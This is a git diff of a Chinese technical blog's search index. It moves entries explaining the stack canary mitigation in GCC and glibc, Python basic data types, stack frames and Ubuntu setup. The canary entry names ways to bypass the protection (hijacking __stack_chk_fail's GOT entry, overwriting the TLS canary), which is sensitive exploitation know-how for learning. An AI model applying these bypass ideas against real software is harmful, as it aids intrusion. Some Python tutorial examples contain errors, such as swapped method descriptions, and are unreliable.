@@ -1,43 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>canary</title>
-    <url>/2019/11/08/canary/</url>
-    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
-<p><strong>Canary</strong></p>
-<p>Introduction</p>
-<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
-<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
-<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
-<p><strong>Canary 原理</strong></p>
-<p>在 GCC 中使用 Canary</p>
-<p>可以在 GCC 中使用以下参数设置 Canary:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
-
-<p><strong>Canary 实现原理</strong> </p>
-<p>开启 Canary 保护的 stack 结构大概如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
-
-<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
-
-<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
-<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
-
-<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>保护机制</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>level0</title>
     <url>/2019/08/08/level0/</url>
     <content><![CDATA[<a id="more"></a>
@@ -95,6 +58,147 @@ p.interactive()</code></pre><p>`</p>
 ]]></content>
       <tags>
         <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>canary</title>
+    <url>/2019/11/08/canary/</url>
+    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
+<p><strong>Canary</strong></p>
+<p>Introduction</p>
+<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
+<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
+<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
+<p><strong>Canary 原理</strong></p>
+<p>在 GCC 中使用 Canary</p>
+<p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
+
+<p><strong>Canary 实现原理</strong> </p>
+<p>开启 Canary 保护的 stack 结构大概如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
+<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>保护机制</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python基本数据类型</title>
+    <url>/2019/08/08/python/</url>
+    <content><![CDATA[<a id="more"></a>
+
+
+
+
+<p>python在写代码时不用声明变量</p>
+<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
+数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
+其中包括他们的基本用法和其常用的方法，这里会一一列举出来
+然后我们还需要了解一些运算符，
+因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
+<p>1、数字  —&gt; int类</p>
+<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
+<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
+<p>2、布尔值  </p>
+<p>—&gt;bool类
+　　</p>
+<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
+<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
+<p>—》</p>
+<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
+<p>3、字符串  </p>
+<p>—&gt;str类</p>
+<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
+<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
+<p>#一</p>
+<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;
+
+截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
+             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
+<p>索引         index()、find()</p>
+<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
+<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
+#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个
+
+        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
+<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
+<pre><code>#删除字符串，也是删除变量
+&gt;&gt;&gt; name =&quot;little-five&quot;
+&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
+<pre><code>isalnum()    #判断是否全为数字
+isalpha()    #判断是否全为字母
+isdigit()    #判断是否全为数字或者字母
+
+返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
+<pre><code>#大小写的互相转换    s.swapcase()
+#首字母大写        s.capitalize()
+#全部转为小写        s.lower()
+#全部转为大写        s.upper()</code></pre><p>jion方法</p>
+<pre><code>#join--&gt; join(): 连接字符串数组。
+将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串
+
+#字符串
+name =&quot;littefive&quot;
+&quot;-&quot;.join(name)
+&apos;l-i-t-t-e-f-i-v-e&apos;
+
+#列表
+info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
+&quot;--&quot;.join(info)
+&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
+<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
+ #或者
+names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
+<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
+<p>　pop()        取出</p>
+<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量
+
+name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
+special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
+<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
+<pre><code>#元组
+name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
+print(name[0])</code></pre><p>#四.<br>字典        dict类
+　　　 </p>
+<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
+　</p>
+<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
+<p>而值的定义可以是任意数据类型。</p>
+<pre><code>#字典的定义
+
+info ={
+    1:&quot;hello world&quot;,  #键为数字
+    (&quot;hello world&quot;):1, #键为元组
+    False:{&quot;name&quot;:&quot;James&quot;},
+    &quot;age&quot;:22
+}    </code></pre><p>遍历        items、keys、values</p>
+<pre><code>info ={
+   &quot;name&quot;:&quot;little-five&quot;,
+   &quot;age&quot;:22,
+   &quot;email&quot;:&quot;99426353*@qq,com&quot;
+}
+#键
+for key in info:
+    print(key)
+    print(info.keys())
+    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>语言基础</tag>
       </tags>
   </entry>
   <entry>
@@ -304,132 +408,6 @@ CMD [&quot;app.py&quot;]
 这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
   </entry>
   <entry>
-    <title>stack</title>
-    <url>/2019/09/27/stack_explain/</url>
-    <content><![CDATA[<a id="more"></a>
-
-
-<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
-<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
-<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
-<pre><code>push   ebp       压栈 esp减小 存入ebp内容
-mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
-<p>一个栈帧从高地址到低地址应该是</p>
-<pre><code>函数参数
-函数返回地址
-ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
-栈内数据
-esp  </code></pre><p>待更新。。</p>
-]]></content>
-      <tags>
-        <tag>有关栈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python基本数据类型</title>
-    <url>/2019/08/08/python/</url>
-    <content><![CDATA[<a id="more"></a>
-
-
-
-
-<p>python在写代码时不用声明变量</p>
-<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
-数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
-其中包括他们的基本用法和其常用的方法，这里会一一列举出来
-然后我们还需要了解一些运算符，
-因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
-<p>1、数字  —&gt; int类</p>
-<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
-<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
-<p>2、布尔值  </p>
-<p>—&gt;bool类
-　　</p>
-<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
-<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
-<p>—》</p>
-<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
-<p>3、字符串  </p>
-<p>—&gt;str类</p>
-<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
-<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
-<p>#一</p>
-<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;
-
-截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
-             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
-<p>索引         index()、find()</p>
-<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
-<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
-#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个
-
-        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
-<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
-<pre><code>#删除字符串，也是删除变量
-&gt;&gt;&gt; name =&quot;little-five&quot;
-&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
-<pre><code>isalnum()    #判断是否全为数字
-isalpha()    #判断是否全为字母
-isdigit()    #判断是否全为数字或者字母
-
-返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
-<pre><code>#大小写的互相转换    s.swapcase()
-#首字母大写        s.capitalize()
-#全部转为小写        s.lower()
-#全部转为大写        s.upper()</code></pre><p>jion方法</p>
-<pre><code>#join--&gt; join(): 连接字符串数组。
-将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串
-
-#字符串
-name =&quot;littefive&quot;
-&quot;-&quot;.join(name)
-&apos;l-i-t-t-e-f-i-v-e&apos;
-
-#列表
-info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
-&quot;--&quot;.join(info)
-&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
-<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
- #或者
-names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
-<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
-<p>　pop()        取出</p>
-<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量
-
-name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
-special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
-<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
-<pre><code>#元组
-name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
-print(name[0])</code></pre><p>#四.<br>字典        dict类
-　　　 </p>
-<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
-　</p>
-<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
-<p>而值的定义可以是任意数据类型。</p>
-<pre><code>#字典的定义
-
-info ={
-    1:&quot;hello world&quot;,  #键为数字
-    (&quot;hello world&quot;):1, #键为元组
-    False:{&quot;name&quot;:&quot;James&quot;},
-    &quot;age&quot;:22
-}    </code></pre><p>遍历        items、keys、values</p>
-<pre><code>info ={
-   &quot;name&quot;:&quot;little-five&quot;,
-   &quot;age&quot;:22,
-   &quot;email&quot;:&quot;99426353*@qq,com&quot;
-}
-#键
-for key in info:
-    print(key)
-    print(info.keys())
-    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>语言基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shell</title>
     <url>/2019/10/09/shell/</url>
     <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
@@ -453,129 +431,25 @@ shell管理你与操作系统之间的交互：
       </tags>
   </entry>
   <entry>
-    <title>ubuntu16.04配置</title>
-    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
-<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
-<p>#拍快照</p>
-<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
-<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
-<p>如果提示 的是 路径， 则直接回车就好。</p>
-<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
-<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
-<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
-https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
-https://www.cnblogs.com/flyinggod/p/7979108.html
-不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+    <title>stack</title>
+    <url>/2019/09/27/stack_explain/</url>
+    <content><![CDATA[<a id="more"></a>
 
-解决问题E: Could not get lock /var/lib/apt/lists/lock
-https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<pre><code>安装：  sudo apt install python-pip
 
-遇到问题，    
-        Unable to locate package python-pip
-解决方法： 更新软件源
-        sudo apt-get update
-
-网址    https://www.jianshu.com/p/568aab038d4c
-    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
-<pre><code>sudo mkdir ~/.pip/
-cd ./.pip/
-touch pip.conf
-sudo gedit pip.conf 
-
